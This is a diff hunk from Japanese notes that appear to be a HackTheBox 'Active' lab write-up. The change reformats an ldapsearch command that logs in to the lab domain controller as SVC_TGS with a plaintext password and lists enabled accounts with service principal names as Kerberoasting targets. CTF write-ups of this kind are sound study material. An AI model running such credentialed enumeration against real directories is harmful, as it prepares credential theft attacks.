@@ -405,11 +405,7 @@ LDAPで、Kerberastingできるアカウントを探す
 	- servicePrincipalName=* … SPN を持つ
 		- Kerberos サービスに関連づけられている
 ```bash
-└──╼ [★]$ ldapsearch -x -H ldap://10.129.213.56 \
--D "ACTIVE\\SVC_TGS" -w 'GPPstillStandingStrong2k18' \
--b "dc=active,dc=htb" \
-"(&(objectClass=user)(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" \
-sAMAccountName servicePrincipalName userAccountControl
+└──╼ [★]$ ldapsearch -x -H ldap://10.129.213.56 -D "ACTIVE\\SVC_TGS" -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" "(&(objectClass=user)(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" sAMAccountName servicePrincipalName userAccountControl
 # extended LDIF
 #
 # LDAPv3
